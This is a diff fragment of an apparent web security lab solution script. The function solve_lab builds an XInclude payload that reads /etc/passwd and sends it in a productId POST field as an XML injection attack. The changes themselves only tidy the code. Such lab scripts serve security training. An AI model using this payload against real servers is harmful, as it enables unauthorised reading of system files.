@@ -12,15 +12,12 @@ def solve_lab(url, proxies):
     xinclude_namespace = "http://www.w3.org/2001/XInclude"
     xinclude = "{%s}" % xinclude_namespace
     nsmap = {"xi": xinclude_namespace}
-    
-    foo = etree.Element(f"{xinclude}foo", nsmap=nsmap)
+
+    foo = etree.Element(f"foo", nsmap=nsmap)
     etree.SubElement(foo, f"{xinclude}include", parse="text", href="file:///etc/passwd")
     foo = etree.tostring(foo).decode()
 
-    data = {
-        "productId": foo,
-        "storeId": "1"
-    }
+    data = {"productId": foo, "storeId": "1"}
 
     print_info(
         f'Injecting an XML external entity with the following POST request to "{url}":\n'
